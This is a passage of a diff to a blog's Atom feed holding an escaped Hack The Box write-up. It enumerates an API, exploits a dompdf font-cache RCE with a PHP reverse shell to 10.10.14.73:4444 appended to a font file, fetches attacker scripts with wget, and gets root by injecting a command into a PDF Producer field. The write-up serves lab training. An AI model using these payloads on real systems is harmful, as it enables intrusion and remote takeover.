-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;, I found some API responses over those endpoints.&lt;/p&gt;
-
-&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$ curl -i http://prd.m.rendering-api.interface.htb/api/                                  
-&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;404&lt;/span&gt; &lt;span class=&quot;ne&quot;&gt;Not Found&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;nginx/1.14.0 (Ubuntu)&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Tue, 14 Feb 2023 08:53:49 GMT&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Transfer-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;chunked&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;keep-alive&lt;/span&gt;
-
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;status&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;404&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;status_text&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;route not defined&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Then I began enumerating the API, by filtering the 404 using a GET request.&lt;/p&gt;
-
-&lt;p&gt;The tricky thing is that you must try to use all the methods &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET,POST,PUT,DELETE&lt;/code&gt; on everything. That could have been easier with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;feroxbuster&lt;/code&gt; but the thing is that on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;feroxbuster&lt;/code&gt; tool there isn’t an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-mc all&lt;/code&gt; option which matches all the response codes and I had to do it manually with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;This is what I’ve used to find another pivot point.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/big.txt -u http://prd.m.rendering-api.interface.htb/api/FUZZ -mc all -fs 50 -X POST
-...
-html2pdf                [Status: 422, Size: 36, Words: 2, Lines: 1...
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;I found other stuff like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;composer,dumpdf&lt;/code&gt; before that and I started to search some exploits for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dumpdf&lt;/code&gt; since I thought that would be the next pivot point and found this PoC of an exploit: https://github.com/positive-security/dompdf-rce.&lt;/p&gt;
-
-&lt;p&gt;The next thing to figure out was how to pass the file to that endpoint. While I tried to just send the file without any parameters, it returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;missing parameters&lt;/code&gt; so I had to explore the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dompdf&lt;/code&gt; implementations. The parameters that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dompdf&lt;/code&gt; uses are just two.&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$dompdf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;loadHtml&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$html&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
-&lt;span class=&quot;nv&quot;&gt;$dompdf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;setPaper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;A4&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;landscape&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$dompdf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;render&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;I know that this is an API, so it must accept some JSON, so I crafted some random payload which I admit I got really lucky.&lt;/p&gt;
-
-&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-	&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;h1&amp;gt;test&amp;lt;/h1&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-	&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;paper&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;A4&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Because the response was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;200 OK&lt;/code&gt; and a binary with the attached PDF.&lt;/p&gt;
-
-&lt;h2 id=&quot;exploiting-the-dumpdf-rce&quot;&gt;Exploiting the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dumpdf RCE&lt;/code&gt;&lt;/h2&gt;
-
-&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dumpdf&lt;/code&gt; is apparently caching the fonts that it processes during the conversion of HTML to PDF. It stores them under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/vendor/dompdf/dompdf/lib/fonts/&lt;/code&gt; folder. Earlier in my discovery I enumerated another possible pivoting point that however gave 403, which was &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/vendor/dompdf/dompdf&lt;/code&gt; so following the PoC I’ve crafted the following payload.&lt;/p&gt;
-
-&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/api/html2pdf&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;prd.m.rendering-api.interface.htb&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Upgrade-Insecure-Requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;1&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;User-Agent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Accept-Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gzip, deflate&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Accept-Language&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;en-US,en;q=0.9&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;application/json&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;close&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;47&lt;/span&gt;
-
-&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-	&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;link rel=stylesheet href=&apos;http://10.10.14.73:8000/syl.css&apos;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-	&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;&quot;paper&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;A4&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# syl.css
-@font-face {
-    font-family:&apos;syl&apos;;
-    src:url(&apos;http://10.10.14.73:8000/syl.php&apos;);
-    font-weight:&apos;normal&apos;;
-    font-style:&apos;normal&apos;;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# syl.php, this is a legit font just with 1 line PHP on the bottom
-&amp;lt;LEGIT FONT BINARY DATA&amp;gt;
-&amp;lt;?php exec(&quot;/bin/bash -c &apos;bash -i &amp;gt; /dev/tcp/10.10.14.73/4444 0&amp;gt;&amp;amp;1&apos;&quot;); ?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;After that I execute the request, the server would try to get the CSS and the font from my server, and it would cache the font into the specified folder and after executing the request. I saw that it does exactly that:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# My Server logs
-10.129.20.249 - - [14/Feb/2023 11:20:07] &quot;GET /syl.css HTTP/1.0&quot; 200 -
-10.129.20.249 - - [14/Feb/2023 11:20:07] &quot;GET /syl.php HTTP/1.0&quot; 200 -
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;That means that we have our ‘font’ already cached on the server under the folder &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/vendor/dompdf/dompdf/lib/fonts/&lt;/code&gt; however what would be the name, because trying to execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syl.php&lt;/code&gt; wasn’t yielding results.&lt;/p&gt;
-
-&lt;p&gt;To figure that out I thought it might be several things, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;md5(file), md5(url of the font), some_hashing_algo(file/url of the font)&lt;/code&gt; so I had to research how it saves the fonts. Fortunately, the PoC gives us a clue of how is this working. The font file there is named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploitfont_normal_3f83639933428d70e74a061f39009622.php&lt;/code&gt; and I brute forced my way out of this by trying &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;syl_normal_&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;md5(file), md5(url of the font)&lt;/code&gt; and the URL of the font was the right one, so I got a reverse shell with that.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -i http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/syl_normal_ee17d95350fea4e27875b56170439107.php
-...
-$ nc -lnvp 4444
-listening on [any] 4444 ...
-connect to [10.10.14.73] from (UNKNOWN) [10.129.20.249] 60822
-pwd
-/var/www/api/vendor/dompdf/dompdf/lib/fonts
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;With that and using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linpeas.sh&lt;/code&gt; I could read the first flag which is located in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/dev/user.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;gaining-root&quot;&gt;Gaining Root&lt;/h2&gt;
-
-&lt;p&gt;This was a tricky one, and I got some help with it since I couldn’t find how. I only found a script that was cleaning some cache files with the tag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Producer: dompdf&lt;/code&gt; in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; folder. The script is located here: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/sbin/cleancache.sh&lt;/code&gt;. I was pretty sure that this is the root pivot point, but I didn’t know how to exploit it.&lt;/p&gt;
-
-&lt;p&gt;I joined some discussions and one of the users mentioned the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;# Bash’s white collar eval: [[ $var -eq 42 ]] runs arbitrary code too&lt;/code&gt; - https://www.vidarholen.net/contents/blog/?p=716&lt;/p&gt;
-
-&lt;p&gt;I didn’t know that you could do that, but after reading the article it was clear what I should do.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cd /tmp
-$ mkdir syl
-$ cd syl &amp;amp;&amp;amp; wget http://10.10.14.73:8000/admin.sh
-$ chmod +x ./admin.sh
-$ wget http://10.10.14.73:8000/test.pdf
-$ exiftool -Producer=&apos;a[$(/tmp/syl/admin.sh&amp;gt;&amp;amp;2)]+42&apos; test.pdf
-&amp;lt; -Producer=&apos;a[$(/tmp/syl/admin.sh&amp;gt;&amp;amp;2)]+42&apos; test.pdf
-    1 image files updated
-$ /usr/local/sbin/cleancache.sh
-/usr/local/sbin/cleancache.sh
-chmod: changing permissions of &apos;/bin/bash&apos;: Operation not permitted
-chmod: changing permissions of &apos;/bin/bash&apos;: Operation not permitted
-$ /bin/bash -p
-bash-4.4# cat /root/root.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">The most important in this machine would be the enumeration, it exploits vulnerabilities like: CVE-2022-28368 Executing files with sudo privileges</summary></entry></feed>
+&lt;/ul&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I’ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.</summary></entry></feed>
